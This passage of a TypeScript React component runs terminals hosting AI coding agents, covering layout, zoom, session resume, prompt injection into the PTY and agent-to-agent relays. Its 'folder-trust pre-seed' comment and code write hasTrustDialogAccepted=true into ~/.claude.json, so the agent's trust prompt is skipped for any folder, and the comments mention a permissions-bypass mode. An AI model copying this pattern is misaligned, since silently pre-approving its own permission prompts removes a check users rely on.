// recompute). The computed key/snapshot + bail condition are byte-for-byte
// identical to the previously inlined blocks.
function makeOcclusionGuard(): (
  n: CanvasNode,
  camera: { x: number; y: number; zoom: number },
  nodes: CanvasNode[]
) => boolean {
  let lastSelfKey = ''
  let lastOcc: number[] = []
  return (n, camera, nodes) => {
    // O(1) pre-guard: this node's geometry + camera (everything that feeds the
    // applied rect and the self portion of the old signature).
    const selfKey =
      n.x + ',' + n.y + ',' + n.w + ',' + n.h + ',' + n.z + ',' + camera.x + ',' + camera.y + ',' + camera.zoom
    // Snapshot front-occluder geometry (5 numbers each) for both the guard
    // comparison and to persist as the next baseline. MUST mirror the occluder
    // set clipPathForBox uses (every kind with z > this node's z) — otherwise a
    // drag/zoom/reorder that changes a front node wouldn't be detected and the
    // clip-path would go stale.
    const occ: number[] = []
    for (const o of nodes) {
      if (o.id === n.id) continue
      if (o.z <= n.z) continue
      occ.push(o.x, o.y, effNodeW(o), effNodeH(o), o.z)
    }
    if (selfKey === lastSelfKey && occ.length === lastOcc.length) {
      let same = true
      for (let i = 0; i < occ.length; i++) {
        if (occ[i] !== lastOcc[i]) {
          same = false
          break
        }
      }
      if (same) return true
    }
    lastSelfKey = selfKey
    lastOcc = occ
    return false
  }
}

const TerminalBox = memo(function TerminalBox({ node }: { node: CanvasNode }): JSX.Element {
  const boxRef = useRef<HTMLDivElement>(null)
  const mountRef = useRef<HTMLDivElement>(null)
  const termRef = useRef<Terminal | null>(null)
  const fitRef = useRef<FitAddon | null>(null)
  // Beacon — the absolute buffer line index the most recent scrollback read used
  // as its window START (total - BEACON_MAX_LINES). A Beacon hit's relative line
  // index is offset by this to recover the absolute buffer line to scroll to.
  const beaconReadStartRef = useRef(0)
  const webglRef = useRef<WebglAddon | null>(null)
  // Latest camera zoom, kept in a ref so the crisp-recompute helper can read it
  // without being re-created. The store subscription below drives the debounced
  // refit on zoom changes.
  const zoomRef = useRef<number>(useCanvas.getState().camera.zoom)
  // Debounced crisp-recompute, owned by the terminal-lifecycle effect but driven
  // from the applyRect subscription so we don't need a SECOND store-wide
  // subscription just to watch camera.zoom. The lifecycle effect publishes its
  // `recompute` here; applyRect calls it (debounced) when zoom actually changes.
  const recomputeRef = useRef<((resizePty: boolean) => void) | null>(null)
  const zoomTimerRef = useRef<number | null>(null)
  // Latest mutable node metadata, kept in a ref updated every render. The
  // terminal-lifecycle effect mounts once per node.id but its long-lived
  // callbacks (narration, Mission Pulse, relay handoffs) must read the CURRENT
  // title/agent — not the values captured at mount — so a rename after mount
  // doesn't keep emitting the stale name for the rest of the session.
  const nodeMetaRef = useRef(node)
  nodeMetaRef.current = node
  const updateNode = useCanvas((s) => s.updateNode)
  // Lighthouse spotlight + Stages scene isolation: dim this terminal's xterm
  // canvas in lockstep with its in-world frame (NodeView) when another node is
  // spotlit. Lighthouse focus (focusNodeId) takes priority; otherwise an active
  // Stage (stageIds, a named durable working set) spotlights its members and dims
  // the rest. Both change rarely, so reactive booleans here are cheap and never
  // affect the hot positioning path. Pure CSS — no geometry, no PTY. (The
  // transient Constellation Filter deliberately does NOT dim the xterm, matching
  // the prior behavior; Stages is a committed focus mode, so it does.)
  const spotlit = useCanvas((s) =>
    s.focusNodeId != null ? s.focusNodeId === node.id : !!s.stageIds?.includes(node.id)
  )
  const dimmed = useCanvas((s) =>
    s.focusNodeId != null
      ? s.focusNodeId !== node.id
      : s.stageIds != null && !s.stageIds.includes(node.id)
  )

  // --- live screen-space positioning --------------------------------------
  // Subscribe to camera + this node's geometry and position the box DOM rect
  // imperatively every change so the terminal tracks pan/zoom in LOCKSTEP with
  // the in-world frame (no React re-render lag, no 1px shimmer). The xterm refit
  // (expensive: reflow + GL atlas re-raster) is debounced separately below.
  useEffect(() => {
    // Cheap early-out: applyRect is driven by a store-wide subscription, so it
    // fires on EVERY store change (status flips during agent streaming, theme/
    // selection/volume, etc.), not just camera/geometry. The expensive bits are the
    // DOM writes and the O(N) clipPathForBox/occluder rebuild, and the old guard
    // unconditionally built an O(N) signature STRING (allocations) before its
    // early-out. We replace that with: an O(1) primitive pre-guard on this node's
    // own rect (x/y/w/h/z) + camera (x/y/zoom). When that key is unchanged a
    // status-only update can still only move the clip via a higher-z occluder's
    // GEOMETRY, so we compare each occluder's geometry against a stored snapshot
    // (numbers, no string allocation) and bail when nothing moved. Any real
    // geometry/occlusion/camera change falls through to the full recompute, so the
    // applied rect + clipPath are byte-for-byte identical to before.
    const guard = makeOcclusionGuard()
    const applyRect = (): void => {
      const box = boxRef.current
      if (!box) return
      const s = useCanvas.getState()
      const n = s.nodes.find((x) => x.id === node.id)
      if (!n) return
      // Zoom watcher, folded in here so this is the ONLY store-wide subscription
      // per box (was a separate useCanvas.subscribe). On a real zoom change we
      // re-derive font + refit, debounced so a pinch/scroll doesn't thrash
      // xterm's reflow + GL atlas re-raster. The DOM rect below still follows
      // immediately; only the refit is debounced — identical to the old behavior.
      const z = s.camera.zoom
      // Atlas — Semantic Zoom LOD: below LOD_ZOOM this terminal is too small to
      // read, so we SUSPEND its screen-space xterm overlay and let NodeView's
      // in-world Glance Card show through the node body instead. SAFETY: this is
      // a pure hide — the xterm/pty/addons are NEVER disposed (that only happens
      // in the lifecycle effect's cleanup). We simply hide the box, drop its
      // pointer events + clip, and SKIP the debounced FitAddon refit while
      // suspended. Re-crossing the threshold upward falls into the normal zoom
      // refit path below, which re-fits cleanly with constant cols/rows (font =
      // BASE_FONT*zoom), so the TUI never reflows.
      const suspended = z < LOD_ZOOM
      if (z !== zoomRef.current) {
        zoomRef.current = z
        if (zoomTimerRef.current != null) window.clearTimeout(zoomTimerRef.current)
        // While suspended the box isn't painted, so there's no point refitting;
        // the refit fires when we come back above the threshold (z change again).
        if (!suspended) {
          zoomTimerRef.current = window.setTimeout(() => {
            zoomTimerRef.current = null
            recomputeRef.current?.(true)
          }, 80)
        }
      }
      // When suspended, mirror the existing visible===false early path: collapse
      // the box (hidden, no pointer events, no clip) and bail before the O(N)
      // occluder/clip recompute. The occlusion guard is intentionally not used
      // here (it would early-return on an unchanged rect and leave the box
      // visible); the suspended branch is cheap and idempotent.
      if (suspended) {
        box.style.visibility = 'hidden'
        box.style.pointerEvents = 'none'
        box.style.clipPath = 'none'
        // Suspended overlay shows the in-world Glance Card, not the xterm glass —
        // drop any frost reveal so the blurred backdrop doesn't bleed there.
        frostUnregister(node.id)
        return
      }
      if (guard(n, s.camera, s.nodes)) return
      const r = screenRectForNode(n, s.camera)
      box.style.left = r.left + 'px'
      box.style.top = r.top + 'px'
      box.style.width = r.width + 'px'
      box.style.height = r.height + 'px'
      box.style.visibility = r.visible ? 'visible' : 'hidden'
      // Bottom corners track the in-world frame's rounded corner at this zoom. The
      // box now spans the FULL frame (no border inset), so it uses the frame's full
      // radius — its rounded bottom lines up exactly with the frame corner.
      const radius = Math.max(0, NODE_RADIUS * s.camera.zoom)
      box.style.borderBottomLeftRadius = radius + 'px'
      box.style.borderBottomRightRadius = radius + 'px'
      // Border width tracks the in-world header border (1px * zoom) so the body's
      // INSET ring is colineal and equal-thickness with the header border at any
      // zoom. Consumed by --term-border-w in index.css (.terminal-overlay-box and
      // .spotlit). INSET (not the old OUTSET) so the edge sits ON the box/frame
      // edge instead of 1px outside it. min 1px = visible seam at sub-px zooms,
      // matching how the GPU rasterizes the header border. Mirrors the radius
      // scaling above (NODE_RADIUS * zoom).
      const borderW = Math.max(1, Math.round(BORDER * s.camera.zoom))
      box.style.setProperty('--term-border-w', borderW + 'px')
      // Higher-z windows covering this terminal, as ROUNDED occlusion holes.
      // Drives BOTH the occlusion clip-path AND the frosted-backdrop reveal from
      // ONE source so they can never drift.
      const holes = r.visible ? occludersForBox(n, s.nodes, s.camera, r) : []
      // Cut holes where higher-z windows overlap, so a front window covers this
      // terminal instead of the terminal floating above it (and without blanking
      // the whole terminal to its solid-blue node body).
      box.style.clipPath = r.visible ? clipPathForBox(n, s.nodes, s.camera, r) : 'none'
      box.style.pointerEvents = r.visible ? 'auto' : 'none'
      // Publish the frost reveal for the z-29 BackdropFrost layer: the box's OUTER
      // shape (square top against the header, rounded bottom) MINUS the SAME
      // rounded occluder holes the clip uses — so the frost matches the clip
      // exactly and fills the front window's rounded-corner triangles (no
      // "piquitos"). The mask rebuild is rAF-coalesced (BackdropFrost).
      const outerShape = {
        x: r.left,
        y: r.top,
        w: r.width,
        h: r.height,
        r: radius,
        tl: 0,
        tr: 0,
        br: radius,
        bl: radius
      }
      if (!r.visible) {
        frostUnregister(node.id)
      } else if (holes.length === 0) {
        frostRegister(node.id, { z: n.z, outer: outerShape })
      } else {
        // Fully-covered check (rectangular; sub-pixel rounded slivers ignored).
        const covered = computeVisibleRects(
          { x: 0, y: 0, w: r.width, h: r.height },
          holes.map((hl) => ({ x0: hl.x0, y0: hl.y0, x1: hl.x1, y1: hl.y1 }))
        )
        if (covered.length === 0) {
          frostUnregister(node.id)
        } else {
          frostRegister(node.id, {
            z: n.z,
            outer: outerShape,
            holes: holes.map((hl) => ({
              x: hl.x0 + r.left,
              y: hl.y0 + r.top,
              w: hl.x1 - hl.x0,
              h: hl.y1 - hl.y0,
              r: 0,
              tl: hl.tl,
              tr: hl.tr,
              br: hl.br,
              bl: hl.bl
            }))
          })
        }
      }
    }
    applyRect()
    const unsub = useCanvas.subscribe(applyRect)
    return () => {
      unsub()
      // Drop this box's frosted-backdrop reveal so a closed/unmounted terminal
      // leaves no stale rect in the shared mask.
      frostUnregister(node.id)
    }
  }, [node.id])

  // Belt-and-suspenders: stop a wheel over this terminal from bubbling up to the
  // canvas viewport's NATIVE wheel listener (which pans/zooms). The canvas-side
  // [data-terminal-overlay] guard is the load-bearing fix, but a native
  // stopPropagation here keeps xterm-only scrolling working even if that guard is
  // later removed. We do NOT preventDefault — xterm must still scroll. When the
  // overlay is suspended at low zoom the box is pointerEvents:none and never
  // receives the event, so canvas panning over the glance card is unaffected.
  useEffect(() => {
    const box = boxRef.current
    if (!box) return
    const stop = (e: WheelEvent): void => {
      e.stopPropagation()
    }
    box.addEventListener('wheel', stop, { passive: true })
    return () => box.removeEventListener('wheel', stop)
  }, [])

  useEffect(() => {
    const mount = mountRef.current!
    const term = new Terminal({
      fontFamily: '"Berkeley Mono","JetBrains Mono","SF Mono",ui-monospace,Menlo,monospace',
      fontSize: BASE_FONT,
      lineHeight: 1.12,
      letterSpacing: 0,
      cursorBlink: true,
      allowTransparency: true,
      scrollback: 8000,
      theme: { ...THEME, background: xtermGlassBg() },
      fontWeight: '400',
      fontWeightBold: '700'
    })
    const fit = new FitAddon()
    term.loadAddon(fit)
    term.loadAddon(new WebLinksAddon())
    // Mount xterm directly into the screen-space box's inner div. The box is at
    // real device pixels with no CSS scale, so its <canvas> composites 1:1.
    term.open(mount)
    termRef.current = term
    fitRef.current = fit

    // --- Beacon: register a scrollback reader for canvas-wide content search ---
    // Reads the live xterm buffer line-by-line into plain text (newest last),
    // bounded to the last BEACON_MAX_LINES for cost. The closure is registered in
    // termRegistry under this node's id and torn down in cleanup so a closed
    // terminal never appears in a Beacon snapshot. The index in the returned array
    // is the SAME index Beacon hands back to scrollToBeaconLine below.
    termRegistry.register(node.id, () => {
      const buf = term.buffer.active
      const total = buf.length
      if (!total) return []
      const start = Math.max(0, total - BEACON_MAX_LINES)
      beaconReadStartRef.current = start
      const out: string[] = []
      for (let i = start; i < total; i++) {
        const ln = buf.getLine(i)
        out.push(ln ? ln.translateToString(true) : '')
      }
      return out
    })

    // --- crisp-at-any-zoom geometry -----------------------------------------
    // The box already has its real on-screen pixel size (node.w*z × (node.h-
    // HEADER)*z) from applyRect. We set fontSize = BASE_FONT * zoom so FitAddon
    // yields the SAME cols/rows as at zoom 1 (cellW scales with the font), which
    // means no TUI reflow on pure zoom — while xterm's WebGL backing store is
    // rasterized at the scaled font over the real CSS box => net scale 1 =>
    // crisp glyphs at every zoom.
    const applyGeometry = (): void => {
      const z = zoomRef.current || 1
      term.options.fontSize = clampFont(BASE_FONT * z)
      // Bottom-inset reservation (terminal clip fix). FitAddon derives
      // rows = floor(availableHeight / cellHeight) from THIS mount's content
      // height. With lineHeight 1.12 the cell height is fractional, so the
      // floored last row plus xterm's viewport sizing could spill the final row
      // UNDER the overlay box's rounded bottom border (overflow:hidden) — Claude
      // Code's footer ("bypass permissions …") was clipped at the very bottom.
      // The static CSS bottom padding only reserves a fixed pixel slack, which is
      // LESS than one cell once zoomed in (cell = BASE_FONT*z*lineHeight grows
      // with zoom while the CSS px stay constant), so the clip would return when
      // zoomed in. Here we set padding-bottom imperatively to a FULL cell height
      // (+1px safety) at the CURRENT zoom so the reserved slack always exceeds
      // one row — guaranteeing the floored last row is fully visible at ANY box
      // size and ANY zoom, before every fit(). Top/left/right insets are left to
      // the stylesheet; only the bottom is overridden.
      const cellH = clampFont(BASE_FONT * z) * 1.12 // matches Terminal lineHeight
      mount.style.paddingBottom = Math.ceil(cellH) + 1 + 'px'
    }

    // Recompute geometry + refit. Resizes the PTY only when cols/rows actually
    // change (true on real node resizes; false on pure zoom). `resizePty` gates
    // whether we even attempt a resize — but we still guard on an actual cols/
    // rows delta so a pure zoom never reflows the agent's TUI.
    let lastCols = term.cols
    let lastRows = term.rows
    const recompute = (resizePty: boolean): void => {
      try {
        applyGeometry()
        fit.fit()
        if (resizePty && (term.cols !== lastCols || term.rows !== lastRows)) {
          window.canvasio.pty.resize(node.id, term.cols, term.rows)
        }
        lastCols = term.cols
        lastRows = term.rows
      } catch {
        /* ignore */
      }
    }
    // Publish so the applyRect subscription can drive the debounced zoom refit
    // without registering a second store-wide subscription.
    recomputeRef.current = recompute

    // Track disposal so a late-resolving dynamic import never touches a dead terminal.
    let disposed = false

    // WebGL for crisp, fast rendering; fall back silently.
    import('@xterm/addon-webgl')
      .then(({ WebglAddon }) => {
        // The terminal may have been disposed before this import resolved.
        if (disposed) return
        try {
          const addon = new WebglAddon()
          // If the GL context is lost, drop the addon so xterm falls back to DOM.
          addon.onContextLoss(() => {
            try {
              addon.dispose()
            } catch {
              /* ignore */
            }
            webglRef.current = null
          })
          term.loadAddon(addon)
          webglRef.current = addon
        } catch {
          /* ignore */
        }
      })
      .catch(() => {
        /* ignore */
      })

    // Initial geometry + fit. We apply zoom geometry first so the very first
    // cols/rows already reflect BASE_FONT * zoom (== the zoom-1 cols/rows).
    applyGeometry()
    try {
      fit.fit()
    } catch {
      /* ignore */
    }
    requestAnimationFrame(() => {
      // Re-run once layout has settled (box size is reliable now).
      recompute(false)
    })

    const cols = term.cols
    const rows = term.rows

    // --- auto-run / session recovery ----------------------------------------
    // `fresh` is true ONLY for nodes created live this session (set by addNode);
    // it is falsy for nodes restored from persistence on cold start (stripped by
    // loadLayout). buildRunCommand turns that into the right command: a FRESH
    // agent starts its session (plain claude / codex), while a RESTORED
    // agent RESUMES its prior conversation (claude --resume / codex resume <id>)
    // instead of opening a blank shell.
    const isFresh = node.fresh === true
    const autoRunCommand = buildRunCommand(node)
    // A fresh Codex session has no id we can preset; capture it from the rollout
    // file shortly after it starts so a later restore can `codex resume <id>`.
    const captureCodexSession = node.agent === 'codex' && isFresh && !node.sessionId
    // CLAUDE post-spawn capture (the resume fix). EMPIRICAL (Claude Code 2.1.179):
    // an INTERACTIVE claude launched the way we launch it does NOT persist the
    // legacy ~/.claude/projects/<cwd>/<uuid>.jsonl transcript, so a pre-assigned
    // `--session-id <uuid>` is NOT reliably resumable — `claude --resume <uuid>`
    // prints "No conversation found with session ID: <uuid>" and falls through to
    // a blank session. What claude DOES write is one line per user prompt in
    // ~/.claude/history.jsonl, tagged with the REAL sessionId and the cwd. So for
    // a fresh claude node we capture that real id from history AFTER the first
    // exchange and persist it as node.sessionId, overwriting any pre-assigned
    // UUID, so the NEXT launch resumes the conversation that actually exists on
    // disk. We only capture when the id we'd resume isn't already confirmed
    // present in history (avoid clobbering a good id on a no-op respawn).
    // Capture for ANY claude node (not just fresh): a RESTORED node whose stale
    // sessionId fails to `--resume` (e.g. an old pre-assigned UUID that never had a
    // transcript) falls back to a blank `claude` — so we must re-capture its NEW
    // real id from history.jsonl too, or it can never self-heal. The update only
    // writes on a real change (below), so a node that resumed correctly just
    // re-confirms the same id (no churn).
    const captureClaudeSession = node.agent === 'claude'
    const codexSince = Date.now()
    // Spawn-time watermark for the history scan: only history entries at/after
    // this instant belong to THIS session, never a stale prior session in the
    // same cwd. Slightly back-dated to absorb minor clock skew between the
    // renderer (here) and the main-process readFileSync of history.jsonl.
    const claudeSince = Date.now() - 2000

    // --- pending-prompt delivery to a freshly-spawned agent ------------------
    // A just-created agent terminal may carry an initial task (`pendingPrompt`)
    // that must be typed into the agent's input prompt — but ONLY once the
    // agent's TUI has actually booted and is ready to receive input (spawning a
    // claude/codex TUI in a PTY takes several seconds). We deliver when the
    // existing status classifier reports the agent's prompt is up (logical
    // 'idle'/'done'), with an 8s safety fallback for agents that boot straight
    // to an idle prompt with no observable status transition.
    const initialPrompt = node.pendingPrompt
    let delivered = false
    let sawNonIdle = false
    let deliverTimer: number | null = null
    // Recall — once-per-node guard so the remembered-facts block is queued AT MOST
    // once for this terminal (idempotent, exactly like the relay/board injection).
    let recallQueued = false
    const deliver = (): void => {
      if (delivered || !initialPrompt) return
      delivered = true
      if (deliverTimer != null) {
        window.clearTimeout(deliverTimer)
        deliverTimer = null
      }
      submitToPty(node.id, initialPrompt)
      updateNode(node.id, { pendingPrompt: undefined, status: 'working' })
      // Keep the effect-local logical status in sync with what we just pushed to
      // the store so the classifier doesn't re-narrate this same 'working' edge.
      logicalStatus = 'working'

      // --- Recall: auto-surface Cross-Mission memory on spawn ----------------
      // After the initial task is delivered, if Auto-recall is on, match the
      // persisted remembered facts against this agent's task and, when any are
      // relevant, ENQUEUE the "Lo que ya sabemos" block onto the SAME relay drain
      // (enqueueForTarget -> deliverRelay -> pty.write) the Brief Board injection
      // uses. It lands on the NEXT readiness edge, after the initial task drains.
      // Guarded once-per-node + wrapped so a memory error can never break spawn.
      if (!recallQueued && recallEnabled()) {
        recallQueued = true
        try {
          const task = [initialPrompt, node.title, node.objective?.text]
            .filter(Boolean)
            .join(' ')
          const matched = matchRecall(useRecall.getState().facts, task)
          const block = recallBlock(matched)
          if (block) useRelay.getState().enqueueForTarget(node.id, block)
        } catch {
          /* never let Recall matching/formatting affect spawn delivery */
        }
      }
    }

    // --- Agent Relay: deliver a queued handoff to THIS terminal --------------
    // When another agent finishes, useRelay.fireSource enqueues instruction
    // text for this node (the rule's target). We drain that queue using the
    // SAME readiness signal as pendingPrompt: once this terminal's classifier
    // reports an idle/ready tail (and it has actually been working before, so we
    // don't fire against a bare shell mid-boot), write the text + '\r' and mark
    // it working — the identical proven pty.write path. A relay delivery never
    // ends; it just consumes one queued instruction per readiness edge.
    let relaySawNonIdle = false
    let relayBusy = false
    const deliverRelay = (): void => {
      if (relayBusy) return
      const instr = useRelay.getState().takeForTarget(node.id)
      if (instr == null) return
      relayBusy = true
      // Smart Relay: when this rule opted in, prepend the live Brief Board so the
      // baton carries the team's real findings, not just the static text. When
      // the flag is false (default) the delivered text is byte-for-byte identical
      // to today. The board block is a single line (boardFormat is terminal-safe),
      // so the existing single-'\r' submit is unchanged.
      let text = instr.text
      if (instr.includeBoard) {
        try {
          const board = formatBoardForInjection(useBoard.getState().facts)
          if (board) text = board + ' — ' + text
        } catch {
          /* never let board formatting break a relay handoff */
        }
      }
      try {
        submitToPty(node.id, text)
      } catch {
        /* fire-and-forget */
      }
      updateNode(node.id, { status: 'working' })
      logicalStatus = 'working'
      narrateBaton(nodeMetaRef.current.title)
      // Re-arm shortly so a second queued handoff can land on the next ready
      // edge; an 8s safety mirror of the pendingPrompt fallback ensures a stuck
      // target never wedges the queue.
      window.setTimeout(() => {
        relayBusy = false
      }, 1500)
    }

    // Begin the narration startup-silence window for this node *now*, before the
    // PTY even spawns. Boot banners / help text that briefly look like an
    // error/done state during the first few seconds must never be narrated.
    registerNodeSpawn(node.id)

    // Mission Pulse: record the node spawn. Memory-only; never affects spawn.
    try {
      useMission.getState().record({
        nodeId: node.id,
        title: node.title,
        agent: node.agent,
        kind: 'spawn'
      })
    } catch {
      /* never let mission recording affect spawn */
    }

    // --- Claude folder-trust pre-seed (resume fix, part 1) -------------------
    // Before spawning an interactive claude in node.cwd, pre-accept its per-folder
    // "Is this a project you trust?" prompt by writing
    // projects[<cwd>].hasTrustDialogAccepted=true into ~/.claude.json. EMPIRICAL
    // (2.1.179): without this, claude in a not-yet-trusted dir blocks on that
    // prompt and EXITS code 1 without persisting anything — and the user's
    // `--dangerously-skip-permissions` shell function does NOT bypass it. We do
    // this for ANY claude spawn (fresh OR restored), since a restored node may be
    // resuming in a dir that was trusted in dev but not in the installed app.
    // Best-effort, never blocks/aborts the spawn: we run it, then spawn
    // regardless (the PTY's own ~350ms command delay gives this ample time to
    // land before claude actually starts).
    const trustReady =
      node.agent === 'claude' && node.cwd
        ? window.canvasio.session?.claudeTrust(node.cwd).catch(() => false) ?? Promise.resolve(false)
        : Promise.resolve(true)

    // --- Claude real-session-id capture (resume fix, part 2) -----------------
    // Poll ~/.claude/history.jsonl for the REAL sessionId of this fresh claude
    // session (matched on project===cwd, timestamp>=spawn) and persist it as
    // node.sessionId so the NEXT launch resumes the conversation that actually
    // exists on disk. claude only appends a history line AFTER the user's first
    // prompt, so we retry on an interval for a while, stopping as soon as we
    // capture an id (or on disposal). Tracked here so cleanup can clear it.
    let claudeCaptureTimer: number | null = null
    const startClaudeCapture = (): void => {
      // No node.cwd requirement: a terminal with no working folder spawns in the
      // home dir (resolveSafeCwd default), so we still capture — detectClaudeHistory
      // defaults its cwd match to home when none is given.
      if (!captureClaudeSession) return
      let tries = 0
      const MAX_TRIES = 60 // ~5 min at 5s cadence — covers a slow first exchange
      const tick = (): void => {
        if (disposed) return
        tries++
        window.canvasio.session
          ?.detectClaudeHistory(claudeSince, node.cwd)
          .then((sid) => {
            if (disposed) return
            if (sid) {
              const cur = useCanvas.getState().nodes.find((n) => n.id === node.id)
              // Persist the captured real id (overwriting any pre-assigned UUID
              // that interactive claude never actually persisted). Only write on
              // an actual change so we don't churn the store / persistence.
              if (cur && cur.sessionId !== sid) {
                updateNode(node.id, { sessionId: sid })
              }
              claudeCaptureTimer = null
              return // captured — stop polling
            }
            if (tries < MAX_TRIES) {
              claudeCaptureTimer = window.setTimeout(tick, 5000)
            } else {
              claudeCaptureTimer = null
            }
          })
          .catch(() => {
            if (disposed) return
            if (tries < MAX_TRIES) claudeCaptureTimer = window.setTimeout(tick, 5000)
            else claudeCaptureTimer = null
          })
      }
      // First check a few seconds in (after the TUI has booted), then on cadence.
      claudeCaptureTimer = window.setTimeout(tick, 5000)
    }

    // spawn the PTY (after trust is seeded for claude, so the trust write always
    // lands before claude reads it; for other agents trustReady resolves true
    // immediately so there's no added latency).
    trustReady.finally(() => {
      if (disposed) return
      window.canvasio.pty
        .spawn({
          id: node.id,
          cols,
          rows,
          cwd: node.cwd,
          command: autoRunCommand
        })
        .then(() => {
          if (autoRunCommand) updateNode(node.id, { status: 'working' })
          // Safety fallback: deliver the initial task even if no readiness
          // transition is ever classified (e.g. an agent that boots straight to
          // an idle prompt with no status change to observe).
          if (initialPrompt && !delivered) {
            deliverTimer = window.setTimeout(deliver, 8000)
          }
          // Capture the freshly-created Codex session id (from its rollout file)
          // so a later launch can resume THIS conversation. Best-effort: a few
          // seconds after start, ask main for the newest rollout written since we
          // spawned, and persist it on the node.
          if (captureCodexSession) {
            window.setTimeout(() => {
              window.canvasio.session
                ?.detectCodex(codexSince)
                .then((sid) => {
                  if (sid && !useCanvas.getState().nodes.find((n) => n.id === node.id)?.sessionId) {
                    updateNode(node.id, { sessionId: sid })
                  }
                })
                .catch(() => {})
            }, 4000)
          }
          // Capture the REAL claude session id from history.jsonl (see above).
          startClaudeCapture()
        })
        .catch(() => updateNode(node.id, { status: 'error' }))
    })

    // --- live status detection + narration ----------------------------------
    // We classify the *agent's* output, not the user's keystroke echoes. To stay
    // cheap on noisy streams we coalesce incoming chunks and classify on a
    // throttled flush rather than on every write.
    const agent = node.agent ?? 'shell'
    const classifier = createClassifier(agent, node.status ?? 'idle')
    // Only terminal/agent nodes drive live previews. A new web preview node
    // would itself be a non-terminal node, so this also prevents recursion.
    const wantsPreview = node.kind === 'terminal'
    // Track the logical status separately so we can narrate `waiting` even though
    // the store only stores a visual status.
    let logicalStatus: AgentStatus = node.status === 'working' ? 'working' : 'idle'
    // Mission Pulse: wall-clock time this node last entered 'working', so a
    // transition OUT of working can report how long it was working. null when
    // the node is not currently working.
    let workingSince: number | null = logicalStatus === 'working' ? Date.now() : null
    let exited = false
    let pendingChunks = ''
    let flushTimer: number | null = null

    const applyStatus = (logical: AgentStatus, visual: ReturnType<typeof mapToVisual>): void => {
      const prevLogical = logicalStatus
      if (logical === prevLogical) return
      logicalStatus = logical
      updateNode(node.id, { status: visual })
      narrateTransition(node.id, nodeMetaRef.current.title, nodeMetaRef.current.agent, prevLogical, logical)

      // Readiness-based delivery of a pending initial task: the agent's input
      // prompt being "up" surfaces as a logical transition into 'idle'/'done'.
      // We only treat that as ready once we've first seen the agent boot/work
      // (sawNonIdle), so we don't fire against the bare shell before the TUI
      // has actually come up.
      if (initialPrompt && !delivered) {
        if (logical === 'working' || logical === 'waiting') {
          sawNonIdle = true
        } else if ((logical === 'idle' || logical === 'done') && sawNonIdle) {
          deliver()
        }
      }

      // --- Agent Relay: source firing -------------------------------------
      // This is the single transition chokepoint. When THIS node logically
      // finishes (done) or errors, fire its relay rules: each armed rule for
      // this source enqueues its instruction for its target. Fire-and-forget.
      if (logical === 'done' || logical === 'error') {
        try {
          // Snapshot the armed rules BEFORE firing so we can record each handoff
          // (source -> target: 'text') in the Mission Pulse timeline. fireSource
          // disarms `once` rules, so reading after would miss them.
          const relay = useRelay.getState()
          const fired = relay.rulesForSource(node.id).filter((r) => r.armed)
          relay.fireSource(node.id)
          if (fired.length) {
            try {
              const nodes = useCanvas.getState().nodes
              for (const r of fired) {
                const target = nodes.find((n) => n.id === r.targetId)
                useMission.getState().record({
                  nodeId: node.id,
                  title: nodeMetaRef.current.title,
                  agent: nodeMetaRef.current.agent,
                  kind: 'relay',
                  detail: `${nodeMetaRef.current.title} -> ${target?.title ?? t('terminalOverlay.agent')}: '${r.text}'`
                })
              }
            } catch {
              /* never let mission recording affect relay */
            }
          }
        } catch {
          /* never let a relay error affect status handling */
        }
      }

      // --- Agent Relay: target readiness ----------------------------------
      // Mirror the pendingPrompt readiness gate to drain a queued handoff for
      // THIS node once its prompt is up (idle/done) AND it has worked before.
      if (logical === 'working' || logical === 'waiting') {
        relaySawNonIdle = true
      } else if ((logical === 'idle' || logical === 'done') && relaySawNonIdle) {
        deliverRelay()
      }

      // --- Mission Pulse: record the transition --------------------------
      // Run LAST so a throw here can never affect status/narration/relay (it is
      // additionally wrapped in try/catch). We track per-node working time:
      // entering 'working' stamps workingSince; leaving it computes durationMs.
      try {
        const now = Date.now()
        if (logical === 'working') {
          // Only log a fresh work-start when not already mid-work (the early
          // `logical === prevLogical` guard above already filters no-ops).
          workingSince = now
          useMission.getState().record({
            nodeId: node.id,
            title: nodeMetaRef.current.title,
            agent: nodeMetaRef.current.agent,
            kind: 'work-start'
          })
          // Open Questions: a fresh work-start means this agent moved on, so any
          // question it had open is stale — auto-resolve its cards (memory-only,
          // fire-and-forget). Mirrors the board's per-node clearing philosophy.
          try {
            useQuestions.getState().resolveForNode(node.id)
          } catch {
            /* never let the questions bus affect status handling */
          }
        } else if (logical === 'done' || logical === 'error' || logical === 'waiting') {
          const durationMs = workingSince != null ? now - workingSince : undefined
          workingSince = null
          useMission.getState().record({
            nodeId: node.id,
            title: nodeMetaRef.current.title,
            agent: nodeMetaRef.current.agent,
            kind: logical,
            durationMs
          })
          // Agent Scorecard: fold the SAME outcome into the persisted cross-mission
          // track record (done/error only in v1 — a 'waiting' here is a pause, not a
          // stall, so it is intentionally not counted). Its own try/catch so a
          // persisted-store hiccup can NEVER affect terminal status/narration/relay.
          if (logical === 'done' || logical === 'error') {
            try {
              useScorecard.getState().recordOutcome({
                kind: nodeMetaRef.current.agent,
                outcome: logical,
                durationMs,
                // Skill Memory: hand the task text to the scorecard so it can sort this
                // outcome into a coarse skill bucket and learn who's reliable AT WHAT.
                // The full node is in hand here; prefer the explicit objective, fall
                // back to the initial pending prompt.
                task: nodeMetaRef.current.objective?.text || nodeMetaRef.current.pendingPrompt
              })
            } catch {
              /* never let scorecard recording affect status handling */
            }
          }
        }
        // 'idle' transitions are intentionally not recorded (keeps the feed to
        // meaningful moments, mirroring narration's silent idle/working policy).
      } catch {
        /* never let mission recording affect status handling */
      }
    }

    const flushClassify = (): void => {
      flushTimer = null
      if (exited || !pendingChunks) return
      const chunk = pendingChunks
      pendingChunks = ''
      const change = classifyChunkVisual(classifier, chunk, agent)
      if (change) applyStatus(change.logical, change.visual)

      // Agent Lens: capture the latest meaningful clean line at this exact
      // chokepoint. classifyChunkVisual already ANSI-strips internally to feed
      // the classifier and then discards the clean text; we reuse the same
      // stripAnsi pass on the coalesced chunk and surface the last readable line
      // as the node's live "what it's doing right now" excerpt. Memory-only,
      // fire-and-forget — must never affect status/preview.
      try {
        const clean = stripAnsi(chunk)
        const line = lastMeaningfulLine(clean)

        // Command Trail: scan EVERY meaningful line of the same already-stripped
        // chunk (NOT just the last one — a command can appear mid-chunk, e.g. a
        // `$ cmd` followed by its output in the same coalesced flush) through the
        // pure detectCommand classifier, pushing each recognized invocation +
        // risk tag into this node's capped audit ring. Reuses the SAME stripAnsi
        // pass (zero new parse pass), gated by the settings flag, memory-only and
        // fire-and-forget inside this same try/catch so it can never affect
